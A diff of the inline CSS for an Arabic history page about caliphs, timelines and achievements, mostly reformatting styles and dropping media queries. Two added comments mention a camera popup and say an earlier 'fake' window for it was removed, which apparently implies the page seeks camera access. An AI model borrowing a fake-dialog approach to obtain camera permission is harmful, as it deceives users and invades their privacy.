@@ -7,8 +7,12 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
 <style>
-  /* جميع التصميمات كما هي (لم تتغير) */
-  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+  /* ---------- المتغيرات والثوابت ---------- */
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
 
   :root {
     --bg: #000000;
@@ -25,18 +29,16 @@
     --transition: all 0.25s ease;
   }
 
-  html { scroll-behavior: smooth; }
+  html {
+    scroll-behavior: smooth;
+  }
+
   body {
     background: var(--bg);
     color: var(--white);
     font-family: var(--font-body);
     overflow-x: hidden;
     -webkit-font-smoothing: antialiased;
-  }
-
-  footer .footer-note {
-    font-size: 0.72rem;
-    color: var(--gray-dim);
   }
 
   /* زر العودة للأعلى */
@@ -63,69 +65,19 @@
     opacity: 1;
     visibility: visible;
   }
-  .scroll-top:hover {
-    background: rgba(212,168,67,0.4);
-    transform: scale(1.05);
-  }
   .scroll-top svg {
     width: 20px;
     fill: var(--gold);
   }
 
-  /* تحسينات الاستجابة */
-  @media (max-width: 768px) {
-    .hero-title { font-size: clamp(2.8rem, 12vw, 5rem); }
-    .hero-stats { flex-wrap: wrap; gap: 0; border-radius: 18px; }
-    .hstat { padding: 16px 20px; }
-    .hstat-val { font-size: 1.8rem; }
-    .intro-grid { gap: 40px; }
-    .dome-wrap { width: 200px; height: 200px; }
-    .planet-wrap { width: 220px; height: 220px; }
-    .cube-scene { transform: scale(0.8); }
-    .ach-card { padding: 24px 20px; }
-    .caliph-card { padding: 20px 12px; }
-    .caliph-name { font-size: 0.85rem; }
-    .quote-text { font-size: 1.2rem; padding: 0 16px; }
-    .nav-links { gap: 16px; }
-    nav { padding: 0 20px; }
-  }
+  /* نافذة المنبثقة الخاصة بالكاميرا (رسمية من المتصفح، لا حاجة لنافذة مزيفة) */
+  /* تم إلغاء الفكرة المزيفة تمامًا لضمان عمل الكاميرا */
 
-  @media (min-width: 1200px) {
-    .container { max-width: 1200px; margin: 0 auto; }
-    .hero-stats { gap: 0; }
-    .ach-cards { grid-template-columns: repeat(3,1fr); }
-  }
-
-  @media (max-width: 900px) {
-    .timeline { grid-template-columns: 40px 1fr; }
-    .tl-content.left { display: none; }
-    .tl-content.right { grid-column: 2; text-align: right; }
-    .tl-node { grid-column: 1; }
-    .ach-cards { grid-template-columns: 1fr 1fr; }
-    .caliphs-grid { grid-template-columns: repeat(2,1fr); }
-  }
-
-  @media (max-width: 600px) {
-    .ach-cards { grid-template-columns: 1fr; }
-    .caliphs-grid { grid-template-columns: 1fr 1fr; }
-  }
-
-  .ach-card, .caliph-card, .rtag, .pill {
-    transition: var(--transition);
-  }
-  .ach-card:hover { background: #111111; transform: translateY(-3px); }
-  .caliph-card:hover { background: #111111; transform: scale(1.02); }
-
-  @media (prefers-reduced-motion: reduce) {
-    .dome-wrap, .cube, .planet-ring, .scroll-arrow {
-      animation: none !important;
-    }
-  }
-
-  /* باقي التصميمات الأساسية (كما هي) */
+  /* ---------- تنسيقات القسم العلوي (Nav, Hero) ---------- */
   nav {
     position: fixed;
-    top: 0; inset-inline: 0;
+    top: 0;
+    inset-inline: 0;
     z-index: 1000;
     height: 52px;
     display: flex;
@@ -136,435 +88,1074 @@
     backdrop-filter: saturate(180%) blur(20px);
     border-bottom: 1px solid var(--border-light);
   }
-  .nav-logo { font-family: var(--font-display); font-size: 1.1rem; color: var(--gold); }
-  .nav-links { display: flex; gap: 28px; list-style: none; }
-  .nav-links a { color: rgba(245,245,247,.7); text-decoration: none; font-size: .78rem; transition: color .2s; }
-  .nav-links a:hover { color: var(--white); }
-  .nav-cta { font-size: .78rem; color: var(--gold); background: rgba(212,168,67,.12); border: 1px solid rgba(212,168,67,.3); padding: 6px 16px; border-radius: 980px; cursor: pointer; }
+  .nav-logo {
+    font-family: var(--font-display);
+    font-size: 1.1rem;
+    color: var(--gold);
+  }
+  .nav-links {
+    display: flex;
+    gap: 28px;
+    list-style: none;
+  }
+  .nav-links a {
+    color: rgba(245,245,247,.7);
+    text-decoration: none;
+    font-size: .78rem;
+    transition: color .2s;
+  }
+  .nav-links a:hover {
+    color: var(--white);
+  }
+  .nav-cta {
+    font-size: .78rem;
+    color: var(--gold);
+    background: rgba(212,168,67,.12);
+    border: 1px solid rgba(212,168,67,.3);
+    padding: 6px 16px;
+    border-radius: 980px;
+    cursor: pointer;
+  }
 
-  .hero { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 100px 24px 60px; position: relative; overflow: hidden; }
-  .hero-bg { position: absolute; inset: 0; background: radial-gradient(ellipse 80% 60% at 50% 40%, rgba(212,168,67,.08) 0%, transparent 70%); pointer-events: none; }
-  .hero-bg-grid { position: absolute; inset: 0; background-image: linear-gradient(rgba(212,168,67,.04) 1px, transparent 1px), linear-gradient(90deg, rgba(212,168,67,.04) 1px, transparent 1px); background-size: 60px 60px; mask-image: radial-gradient(ellipse 70% 70% at 50% 50%, black 30%, transparent 100%); pointer-events: none; }
-  .hero-eyebrow { font-size: .72rem; letter-spacing: 4px; color: var(--gold); margin-bottom: 20px; opacity: 0; transform: translateY(16px); animation: up .7s .1s forwards; }
-  .hero-title { font-family: var(--font-display); font-size: clamp(4rem, 11vw, 9rem); font-weight: 700; line-height: 1.05; opacity: 0; transform: translateY(20px); animation: up .8s .25s forwards; }
-  .hero-title em { font-style: normal; background: linear-gradient(135deg, var(--gold-bright), var(--gold), #a06820); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-  .hero-sub { max-width: 560px; font-size: clamp(.9rem, 2vw, 1.05rem); color: var(--gray); font-weight: 300; margin: 24px auto 0; opacity: 0; transform: translateY(16px); animation: up .8s .4s forwards; }
-  .hero-stats { display: flex; gap: 0; margin-top: 64px; border: 1px solid var(--border-light); border-radius: 18px; overflow: hidden; opacity: 0; transform: translateY(16px); animation: up .8s .55s forwards; }
-  .hstat { padding: 28px 48px; text-align: center; border-left: 1px solid var(--border-light); }
-  .hstat:last-child { border-left: none; }
-  .hstat-val { font-family: var(--font-display); font-size: 2.4rem; color: var(--gold-bright); display: block; line-height: 1; }
-  .hstat-lbl { font-size: .72rem; color: var(--gray); margin-top: 6px; letter-spacing: 1px; }
-  .scroll-down { position: absolute; bottom: 32px; left: 50%; transform: translateX(-50%); display: flex; flex-direction: column; align-items: center; gap: 6px; opacity: 0; animation: up .8s .9s forwards; }
-  .scroll-down span { font-size: .65rem; color: var(--gray); letter-spacing: 2px; }
-  .scroll-arrow { width: 20px; height: 20px; border-left: 1.5px solid var(--gold-dim); border-bottom: 1.5px solid var(--gold-dim); transform: rotate(-45deg); animation: bounce 2s infinite; }
-  @keyframes up { to { opacity:1; transform:translateY(0); } }
-  @keyframes bounce { 0%,100%{transform:rotate(-45deg) translateY(0)} 50%{transform:rotate(-45deg) translateY(5px)} }
+  .hero {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    padding: 100px 24px 60px;
+    position: relative;
+    overflow: hidden;
+  }
+  .hero-bg {
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(ellipse 80% 60% at 50% 40%, rgba(212,168,67,.08) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero-bg-grid {
+    position: absolute;
+    inset: 0;
+    background-image: linear-gradient(rgba(212,168,67,.04) 1px, transparent 1px), linear-gradient(90deg, rgba(212,168,67,.04) 1px, transparent 1px);
+    background-size: 60px 60px;
+    mask-image: radial-gradient(ellipse 70% 70% at 50% 50%, black 30%, transparent 100%);
+    pointer-events: none;
+  }
+  .hero-eyebrow {
+    font-size: .72rem;
+    letter-spacing: 4px;
+    color: var(--gold);
+    margin-bottom: 20px;
+    opacity: 0;
+    transform: translateY(16px);
+    animation: up .7s .1s forwards;
+  }
+  .hero-title {
+    font-family: var(--font-display);
+    font-size: clamp(4rem, 11vw, 9rem);
+    font-weight: 700;
+    line-height: 1.05;
+    opacity: 0;
+    transform: translateY(20px);
+    animation: up .8s .25s forwards;
+  }
+  .hero-title em {
+    font-style: normal;
+    background: linear-gradient(135deg, var(--gold-bright), var(--gold), #a06820);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+  }
+  .hero-sub {
+    max-width: 560px;
+    font-size: clamp(.9rem, 2vw, 1.05rem);
+    color: var(--gray);
+    font-weight: 300;
+    margin: 24px auto 0;
+    opacity: 0;
+    transform: translateY(16px);
+    animation: up .8s .4s forwards;
+  }
+  .hero-stats {
+    display: flex;
+    gap: 0;
+    margin-top: 64px;
+    border: 1px solid var(--border-light);
+    border-radius: 18px;
+    overflow: hidden;
+    opacity: 0;
+    transform: translateY(16px);
+    animation: up .8s .55s forwards;
+  }
+  .hstat {
+    padding: 28px 48px;
+    text-align: center;
+    border-left: 1px solid var(--border-light);
+  }
+  .hstat:last-child {
+    border-left: none;
+  }
+  .hstat-val {
+    font-family: var(--font-display);
+    font-size: 2.4rem;
+    color: var(--gold-bright);
+    display: block;
+    line-height: 1;
+  }
+  .hstat-lbl {
+    font-size: .72rem;
+    color: var(--gray);
+    margin-top: 6px;
+    letter-spacing: 1px;
+  }
+  .scroll-down {
+    position: absolute;
+    bottom: 32px;
+    left: 50%;
+    transform: translateX(-50%);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 6px;
+    opacity: 0;
+    animation: up .8s .9s forwards;
+  }
+  .scroll-down span {
+    font-size: .65rem;
+    color: var(--gray);
+    letter-spacing: 2px;
+  }
+  .scroll-arrow {
+    width: 20px;
+    height: 20px;
+    border-left: 1.5px solid var(--gold-dim);
+    border-bottom: 1.5px solid var(--gold-dim);
+    transform: rotate(-45deg);
+    animation: bounce 2s infinite;
+  }
+  @keyframes up {
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+  @keyframes bounce {
+    0%, 100% { transform: rotate(-45deg) translateY(0); }
+    50% { transform: rotate(-45deg) translateY(5px); }
+  }
 
-  .section { padding: 120px 24px; max-width: 1080px; margin: 0 auto; }
-  .s-eyebrow { font-size: .68rem; letter-spacing: 4px; color: var(--gold); margin-bottom: 12px; display: block; }
-  .s-title { font-family: var(--font-display); font-size: clamp(2.2rem, 5vw, 3.8rem); font-weight: 700; line-height: 1.15; margin-bottom: 16px; }
-  .s-desc { color: var(--gray); font-size: 1rem; font-weight: 300; max-width: 560px; line-height: 1.8; }
-  .divider { width: 48px; height: 1.5px; background: linear-gradient(90deg, var(--gold), transparent); margin: 20px 0 40px; }
+  /* الأقسام العامة */
+  .section {
+    padding: 120px 24px;
+    max-width: 1080px;
+    margin: 0 auto;
+  }
+  .s-eyebrow {
+    font-size: .68rem;
+    letter-spacing: 4px;
+    color: var(--gold);
+    margin-bottom: 12px;
+    display: block;
+  }
+  .s-title {
+    font-family: var(--font-display);
+    font-size: clamp(2.2rem, 5vw, 3.8rem);
+    font-weight: 700;
+    line-height: 1.15;
+    margin-bottom: 16px;
+  }
+  .s-desc {
+    color: var(--gray);
+    font-size: 1rem;
+    font-weight: 300;
+    max-width: 560px;
+    line-height: 1.8;
+  }
+  .divider {
+    width: 48px;
+    height: 1.5px;
+    background: linear-gradient(90deg, var(--gold), transparent);
+    margin: 20px 0 40px;
+  }
 
-  .intro-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 80px; align-items: center; }
-  .intro-visual { perspective: 800px; display: flex; justify-content: center; align-items: center; }
-  .dome-wrap { position: relative; width: 260px; height: 260px; transform-style: preserve-3d; animation: rotateDome 20s linear infinite; }
-  @keyframes rotateDome { to { transform: rotateY(360deg); } }
-  .dome-ring { position: absolute; inset: 0; border-radius: 50%; border: 1.5px solid; transform-style: preserve-3d; }
-  .dome-ring:nth-child(1) { border-color: rgba(212,168,67,.6); transform: rotateX(70deg); }
-  .dome-ring:nth-child(2) { border-color: rgba(212,168,67,.3); transform: rotateX(70deg) rotateY(60deg); }
-  .dome-ring:nth-child(3) { border-color: rgba(212,168,67,.2); transform: rotateX(20deg); }
-  .dome-ring:nth-child(4) { border-color: rgba(212,168,67,.15); transform: rotateX(0deg); }
-  .dome-center { position: absolute; inset: 20%; border-radius: 50%; background: radial-gradient(circle at 35% 35%, rgba(240,192,96,.25), rgba(212,168,67,.05)); border: 1px solid rgba(212,168,67,.4); }
-  .dome-star { position: absolute; inset: 30%; display: flex; align-items: center; justify-content: center; font-size: 3.5rem; opacity: .7; }
-  .dome-orbit { position: absolute; inset: -10px; border-radius: 50%; border: 1px dashed rgba(212,168,67,.15); animation: orbit 8s linear infinite; }
-  .dome-orbit-dot { position: absolute; top: 0; left: 50%; width: 6px; height: 6px; margin-left: -3px; margin-top: -3px; border-radius: 50%; background: var(--gold); }
-  @keyframes orbit { to { transform: rotate(360deg); } }
+  /* الـ grid للنشأة */
+  .intro-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 80px;
+    align-items: center;
+  }
+  .intro-visual {
+    perspective: 800px;
+    display: flex;
+    justify-content: center;
+  }
+  .dome-wrap {
+    position: relative;
+    width: 260px;
+    height: 260px;
+    transform-style: preserve-3d;
+    animation: rotateDome 20s linear infinite;
+  }
+  @keyframes rotateDome {
+    to { transform: rotateY(360deg); }
+  }
+  .dome-ring {
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+    border: 1.5px solid;
+    transform-style: preserve-3d;
+  }
+  .dome-ring:nth-child(1) {
+    border-color: rgba(212,168,67,.6);
+    transform: rotateX(70deg);
+  }
+  .dome-ring:nth-child(2) {
+    border-color: rgba(212,168,67,.3);
+    transform: rotateX(70deg) rotateY(60deg);
+  }
+  .dome-ring:nth-child(3) {
+    border-color: rgba(212,168,67,.2);
+    transform: rotateX(20deg);
+  }
+  .dome-ring:nth-child(4) {
+    border-color: rgba(212,168,67,.15);
+    transform: rotateX(0deg);
+  }
+  .dome-center {
+    position: absolute;
+    inset: 20%;
+    border-radius: 50%;
+    background: radial-gradient(circle at 35% 35%, rgba(240,192,96,.25), rgba(212,168,67,.05));
+    border: 1px solid rgba(212,168,67,.4);
+  }
+  .dome-star {
+    position: absolute;
+    inset: 30%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 3.5rem;
+    opacity: .7;
+  }
+  .dome-orbit {
+    position: absolute;
+    inset: -10px;
+    border-radius: 50%;
+    border: 1px dashed rgba(212,168,67,.15);
+    animation: orbit 8s linear infinite;
+  }
+  .dome-orbit-dot {
+    position: absolute;
+    top: 0;
+    left: 50%;
+    width: 6px;
+    height: 6px;
+    margin-left: -3px;
+    margin-top: -3px;
+    border-radius: 50%;
+    background: var(--gold);
+  }
+  @keyframes orbit {
+    to { transform: rotate(360deg); }
+  }
 
-  .intro-pills { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 32px; }
-  .pill { font-size: .73rem; color: var(--gold); background: rgba(212,168,67,.08); border: 1px solid rgba(212,168,67,.2); padding: 5px 14px; border-radius: 980px; }
+  .intro-pills {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-top: 32px;
+  }
+  .pill {
+    font-size: .73rem;
+    color: var(--gold);
+    background: rgba(212,168,67,.08);
+    border: 1px solid rgba(212,168,67,.2);
+    padding: 5px 14px;
+    border-radius: 980px;
+  }
 
-  .band { background: var(--surface); border-top: 1px solid var(--border-light); border-bottom: 1px solid var(--border-light); }
-  .timeline-section { padding: 120px 24px; }
-  .timeline-inner { max-width: 1080px; margin: 0 auto; }
-  .tl-header { text-align: center; margin-bottom: 80px; }
-  .tl-header .s-desc { margin: 0 auto; }
-  .timeline { position: relative; display: grid; grid-template-columns: 1fr 60px 1fr; gap: 0; row-gap: 0; }
-  .tl-line { grid-column: 2; grid-row: 1 / -1; display: flex; justify-content: center; }
-  .tl-line-inner { width: 1px; background: linear-gradient(to bottom, transparent, var(--gold-dim) 10%, var(--gold-dim) 90%, transparent); height: 100%; }
-  .tl-item { display: contents; }
-  .tl-content { padding: 0 40px 64px; opacity: 0; transition: opacity .6s, transform .6s; }
-  .tl-content.left { grid-column: 1; text-align: right; transform: translateX(-24px); }
-  .tl-content.right { grid-column: 3; text-align: left; transform: translateX(24px); }
-  .tl-content.visible { opacity: 1; transform: translateX(0); }
-  .tl-node { grid-column: 2; display: flex; justify-content: center; align-items: flex-start; padding-top: 4px; padding-bottom: 64px; }
-  .tl-dot-wrap { width: 14px; height: 14px; border-radius: 50%; background: var(--bg); border: 2px solid var(--gold); position: relative; }
-  .tl-dot-wrap.pulse { box-shadow: 0 0 0 6px rgba(212,168,67,.15), 0 0 0 12px rgba(212,168,67,.06); }
-  .tl-date { font-size: .68rem; letter-spacing: 2px; color: var(--gold); margin-bottom: 8px; display: block; }
-  .tl-name { font-family: var(--font-display); font-size: 1.3rem; margin-bottom: 8px; }
-  .tl-desc { font-size: .85rem; color: var(--gray); line-height: 1.7; }
-  .tl-badge { display: inline-block; font-size: .65rem; letter-spacing: 1.5px; color: var(--gold-bright); background: rgba(212,168,67,.1); border: 1px solid rgba(212,168,67,.2); padding: 3px 10px; border-radius: 4px; margin-bottom: 10px; }
+  /* الخط الزمني */
+  .band {
+    background: var(--surface);
+    border-top: 1px solid var(--border-light);
+    border-bottom: 1px solid var(--border-light);
+  }
+  .timeline-section {
+    padding: 120px 24px;
+  }
+  .timeline-inner {
+    max-width: 1080px;
+    margin: 0 auto;
+  }
+  .tl-header {
+    text-align: center;
+    margin-bottom: 80px;
+  }
+  .timeline {
+    position: relative;
+    display: grid;
+    grid-template-columns: 1fr 60px 1fr;
+    gap: 0;
+  }
+  .tl-line {
+    grid-column: 2;
+    grid-row: 1 / -1;
+    display: flex;
+    justify-content: center;
+  }
+  .tl-line-inner {
+    width: 1px;
+    background: linear-gradient(to bottom, transparent, var(--gold-dim) 10%, var(--gold-dim) 90%, transparent);
+    height: 100%;
+  }
+  .tl-content {
+    padding: 0 40px 64px;
+    opacity: 0;
+    transition: opacity .6s, transform .6s;
+  }
+  .tl-content.left {
+    grid-column: 1;
+    text-align: right;
+    transform: translateX(-24px);
+  }
+  .tl-content.right {
+    grid-column: 3;
+    text-align: left;
+    transform: translateX(24px);
+  }
+  .tl-content.visible {
+    opacity: 1;
+    transform: translateX(0);
+  }
+  .tl-node {
+    grid-column: 2;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding-top: 4px;
+    padding-bottom: 64px;
+  }
+  .tl-dot-wrap {
+    width: 14px;
+    height: 14px;
+    border-radius: 50%;
+    background: var(--bg);
+    border: 2px solid var(--gold);
+  }
+  .tl-dot-wrap.pulse {
+    box-shadow: 0 0 0 6px rgba(212,168,67,.15), 0 0 0 12px rgba(212,168,67,.06);
+  }
+  .tl-date {
+    font-size: .68rem;
+    letter-spacing: 2px;
+    color: var(--gold);
+    margin-bottom: 8px;
+    display: block;
+  }
+  .tl-name {
+    font-family: var(--font-display);
+    font-size: 1.3rem;
+    margin-bottom: 8px;
+  }
+  .tl-desc {
+    font-size: .85rem;
+    color: var(--gray);
+    line-height: 1.7;
+  }
+  .tl-badge {
+    display: inline-block;
+    font-size: .65rem;
+    letter-spacing: 1.5px;
+    color: var(--gold-bright);
+    background: rgba(212,168,67,.1);
+    border: 1px solid rgba(212,168,67,.2);
+    padding: 3px 10px;
+    border-radius: 4px;
+    margin-bottom: 10px;
+  }
 
-  .cube-section { padding: 120px 24px; background: var(--surface); border-top: 1px solid var(--border-light); border-bottom: 1px solid var(--border-light); text-align: center; }
-  .cube-scene { perspective: 700px; width: 180px; height: 180px; margin: 64px auto; }
-  .cube { width: 180px; height: 180px; position: relative; transform-style: preserve-3d; animation: rotateCube 14s ease-in-out infinite; }
-  @keyframes rotateCube { 0%{ transform: rotateX(-20deg) rotateY(0deg); } 25%{ transform: rotateX(-20deg) rotateY(90deg); } 50%{ transform: rotateX(-20deg) rotateY(180deg); } 75%{ transform: rotateX(-20deg) rotateY(270deg); } 100%{ transform: rotateX(-20deg) rotateY(360deg); } }
-  .cube-face { position: absolute; width: 180px; height: 180px; border: 1px solid rgba(212,168,67,.3); background: rgba(212,168,67,.04); display: flex; align-items: center; justify-content: center; flex-direction: column; gap: 6px; backdrop-filter: blur(4px); }
+  /* مكعب الإنجازات */
+  .cube-section {
+    padding: 120px 24px;
+    background: var(--surface);
+    border-top: 1px solid var(--border-light);
+    border-bottom: 1px solid var(--border-light);
+    text-align: center;
+  }
+  .cube-scene {
+    perspective: 700px;
+    width: 180px;
+    height: 180px;
+    margin: 64px auto;
+  }
+  .cube {
+    width: 180px;
+    height: 180px;
+    position: relative;
+    transform-style: preserve-3d;
+    animation: rotateCube 14s ease-in-out infinite;
+  }
+  @keyframes rotateCube {
+    0% { transform: rotateX(-20deg) rotateY(0deg); }
+    25% { transform: rotateX(-20deg) rotateY(90deg); }
+    50% { transform: rotateX(-20deg) rotateY(180deg); }
+    75% { transform: rotateX(-20deg) rotateY(270deg); }
+    100% { transform: rotateX(-20deg) rotateY(360deg); }
+  }
+  .cube-face {
+    position: absolute;
+    width: 180px;
+    height: 180px;
+    border: 1px solid rgba(212,168,67,.3);
+    background: rgba(212,168,67,.04);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    gap: 6px;
+    backdrop-filter: blur(4px);
+  }
   .cube-face span { font-size: 1.8rem; }
   .cube-face p { font-size: .7rem; color: var(--gold); }
-  .cube-face.front { transform: translateZ(90px); }
-  .cube-face.back { transform: rotateY(180deg) translateZ(90px); }
-  .cube-face.right { transform: rotateY(90deg) translateZ(90px); }
-  .cube-face.left { transform: rotateY(-90deg) translateZ(90px); }
-  .cube-face.top { transform: rotateX(90deg) translateZ(90px); }
+  .cube-face.front  { transform: translateZ(90px); }
+  .cube-face.back   { transform: rotateY(180deg) translateZ(90px); }
+  .cube-face.right  { transform: rotateY(90deg) translateZ(90px); }
+  .cube-face.left   { transform: rotateY(-90deg) translateZ(90px); }
+  .cube-face.top    { transform: rotateX(90deg) translateZ(90px); }
   .cube-face.bottom { transform: rotateX(-90deg) translateZ(90px); }
 
-  .ach-cards { display: grid; grid-template-columns: repeat(3,1fr); gap: 1px; background: var(--border-light); border-radius: 18px; overflow: hidden; margin-top: 64px; max-width: 1080px; margin-inline: auto; }
-  .ach-card { background: var(--surface); padding: 40px 32px; opacity: 0; transform: translateY(20px); transition: opacity .5s, transform .5s, background .25s; }
-  .ach-card.visible { opacity: 1; transform: translateY(0); }
+  .ach-cards {
+    display: grid;
+    grid-template-columns: repeat(3,1fr);
+    gap: 1px;
+    background: var(--border-light);
+    border-radius: 18px;
+    overflow: hidden;
+    margin-top: 64px;
+    max-width: 1080px;
+    margin-inline: auto;
+  }
+  .ach-card {
+    background: var(--surface);
+    padding: 40px 32px;
+    opacity: 0;
+    transform: translateY(20px);
+    transition: opacity .5s, transform .5s;
+  }
+  .ach-card.visible {
+    opacity: 1;
+    transform: translateY(0);
+  }
   .ach-icon { font-size: 2rem; margin-bottom: 16px; display: block; }
-  .ach-title { font-family: var(--font-display); font-size: 1.1rem; color: var(--white); margin-bottom: 10px; }
+  .ach-title {
+    font-family: var(--font-display);
+    font-size: 1.1rem;
+    color: var(--white);
+    margin-bottom: 10px;
+  }
   .ach-text { font-size: .83rem; color: var(--gray); line-height: 1.7; }
 
-  .caliphs-section { padding: 120px 24px; }
-  .caliphs-inner { max-width: 1080px; margin: 0 auto; }
-  .caliphs-header { text-align: center; margin-bottom: 64px; }
-  .caliphs-grid { display: grid; grid-template-columns: repeat(4,1fr); gap: 1px; background: var(--border-light); border-radius: 18px; overflow: hidden; }
-  .caliph-card { background: var(--surface); padding: 28px 20px; text-align: center; opacity: 0; transform: scale(.97); transition: opacity .4s, transform .4s, background .2s; }
-  .caliph-card.visible { opacity: 1; transform: scale(1); }
-  .caliph-num { font-family: var(--font-display); font-size: 1.8rem; color: rgba(212,168,67,.2); line-height: 1; margin-bottom: 10px; }
-  .caliph-name { font-family: var(--font-display); font-size: .95rem; color: var(--white); margin-bottom: 6px; }
+  /* الخلفاء */
+  .caliphs-section {
+    padding: 120px 24px;
+  }
+  .caliphs-inner {
+    max-width: 1080px;
+    margin: 0 auto;
+  }
+  .caliphs-header {
+    text-align: center;
+    margin-bottom: 64px;
+  }
+  .caliphs-grid {
+    display: grid;
+    grid-template-columns: repeat(4,1fr);
+    gap: 1px;
+    background: var(--border-light);
+    border-radius: 18px;
+    overflow: hidden;
+  }
+  .caliph-card {
+    background: var(--surface);
+    padding: 28px 20px;
+    text-align: center;
+    opacity: 0;
+    transform: scale(.97);
+    transition: opacity .4s, transform .4s;
+  }
+  .caliph-card.visible {
+    opacity: 1;
+    transform: scale(1);
+  }
+  .caliph-num {
+    font-family: var(--font-display);
+    font-size: 1.8rem;
+    color: rgba(212,168,67,.2);
+    margin-bottom: 10px;
+  }
+  .caliph-name {
+    font-family: var(--font-display);
+    font-size: .95rem;
+    margin-bottom: 6px;
+  }
   .caliph-years { font-size: .68rem; color: var(--gray); letter-spacing: 1px; }
 
-  .planet-section { padding: 120px 24px; text-align: center; background: var(--surface); border-top: 1px solid var(--border-light); }
-  .planet-wrap { position: relative; width: 280px; height: 280px; margin: 72px auto; perspective: 700px; }
-  .planet-sphere { width: 280px; height: 280px; border-radius: 50%; background: radial-gradient(circle at 30% 30%, rgba(212,168,67,.25) 0%, rgba(122,59,30,.15) 40%, rgba(10,10,10,.9) 100%); border: 1px solid rgba(212,168,67,.3); box-shadow: 0 0 60px rgba(212,168,67,.1), inset -20px -20px 60px rgba(0,0,0,.8), inset 10px 10px 40px rgba(212,168,67,.05); position: relative; overflow: hidden; animation: planetPulse 4s ease-in-out infinite; }
-  @keyframes planetPulse { 0%,100%{ box-shadow: 0 0 60px rgba(212,168,67,.1), inset -20px -20px 60px rgba(0,0,0,.8); } 50%{ box-shadow: 0 0 100px rgba(212,168,67,.18), inset -20px -20px 60px rgba(0,0,0,.8); } }
-  .planet-lines { position: absolute; inset: 0; border-radius: 50%; overflow: hidden; }
-  .planet-line { position: absolute; left: 0; right: 0; height: 1px; background: rgba(212,168,67,.12); }
-  .planet-vline { position: absolute; top: 0; bottom: 0; width: 1px; background: rgba(212,168,67,.12); }
-  .planet-dot { position: absolute; width: 8px; height: 8px; border-radius: 50%; background: var(--gold-bright); box-shadow: 0 0 8px var(--gold-bright); }
-  .planet-ring { position: absolute; inset: -30px; border-radius: 50%; border: 1px solid rgba(212,168,67,.15); animation: orbit 12s linear infinite; }
-  .planet-ring-dot { position: absolute; top: 50%; right: 0; width: 6px; height: 6px; margin-right: -3px; margin-top: -3px; border-radius: 50%; background: var(--gold); }
-  .region-tags { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin-top: 48px; max-width: 680px; margin-inline: auto; }
-  .rtag { font-size: .75rem; color: var(--gold); background: rgba(212,168,67,.07); border: 1px solid rgba(212,168,67,.2); padding: 7px 18px; border-radius: 980px; }
+  /* الكرة الأرضية (الامتداد) */
+  .planet-section {
+    padding: 120px 24px;
+    text-align: center;
+    background: var(--surface);
+    border-top: 1px solid var(--border-light);
+  }
+  .planet-wrap {
+    position: relative;
+    width: 280px;
+    height: 280px;
+    margin: 72px auto;
+    perspective: 700px;
+  }
+  .planet-sphere {
+    width: 280px;
+    height: 280px;
+    border-radius: 50%;
+    background: radial-gradient(circle at 30% 30%, rgba(212,168,67,.25) 0%, rgba(122,59,30,.15) 40%, rgba(10,10,10,.9) 100%);
+    border: 1px solid rgba(212,168,67,.3);
+    box-shadow: 0 0 60px rgba(212,168,67,.1), inset -20px -20px 60px rgba(0,0,0,.8), inset 10px 10px 40px rgba(212,168,67,.05);
+    position: relative;
+    overflow: hidden;
+    animation: planetPulse 4s ease-in-out infinite;
+  }
+  @keyframes planetPulse {
+    0%,100% { box-shadow: 0 0 60px rgba(212,168,67,.1), inset -20px -20px 60px rgba(0,0,0,.8); }
+    50% { box-shadow: 0 0 100px rgba(212,168,67,.18), inset -20px -20px 60px rgba(0,0,0,.8); }
+  }
+  .planet-lines {
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+    overflow: hidden;
+  }
+  .planet-line {
+    position: absolute;
+    left: 0; right: 0;
+    height: 1px;
+    background: rgba(212,168,67,.12);
+  }
+  .planet-vline {
+    position: absolute;
+    top: 0; bottom: 0;
+    width: 1px;
+    background: rgba(212,168,67,.12);
+  }
+  .planet-dot {
+    position: absolute;
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--gold-bright);
+    box-shadow: 0 0 8px var(--gold-bright);
+  }
+  .planet-ring {
+    position: absolute;
+    inset: -30px;
+    border-radius: 50%;
+    border: 1px solid rgba(212,168,67,.15);
+    animation: orbit 12s linear infinite;
+  }
+  .planet-ring-dot {
+    position: absolute;
+    top: 50%; right: 0;
+    width: 6px; height: 6px;
+    margin-right: -3px; margin-top: -3px;
+    border-radius: 50%;
+    background: var(--gold);
+  }
+  .region-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    justify-content: center;
+    margin-top: 48px;
+    max-width: 680px;
+    margin-inline: auto;
+  }
+  .rtag {
+    font-size: .75rem;
+    color: var(--gold);
+    background: rgba(212,168,67,.07);
+    border: 1px solid rgba(212,168,67,.2);
+    padding: 7px 18px;
+    border-radius: 980px;
+  }
 
-  .quote-section { padding: 120px 24px; text-align: center; position: relative; overflow: hidden; }
-  .quote-bg { position: absolute; inset: 0; background: radial-gradient(ellipse 60% 60% at 50% 50%, rgba(212,168,67,.06) 0%, transparent 70%); pointer-events: none; }
